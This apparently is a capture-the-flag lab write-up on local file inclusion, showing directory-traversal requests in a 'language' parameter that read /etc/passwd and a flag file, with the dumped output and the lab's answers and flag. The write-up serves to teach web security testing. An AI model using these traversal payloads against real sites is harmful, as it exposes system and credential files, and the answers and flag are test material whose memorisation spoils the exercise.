# Section 02: Local File Inclusion (LFI)

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Using the file inclusion find the name of a user on the system that starts with "b".

Context:
- Access the `/etc/passwd` via `/index.php?language=../../../../etc/passwd`:
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:105:107::/nonexistent:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin barry:x:1000:1000::/home/barry:/bin/sh
```

**Answer:** `barry`

---

### 2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.

Context:
- Access the `/usr/share/flags/flag.txt` via `/index.php?language=../../../../../usr/share/flags/flag.txt`:
```
HTB{n3v3r_tru$t_u$3r_!nput} 
```

**Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`

---

[Back to Module Index](./README.md)
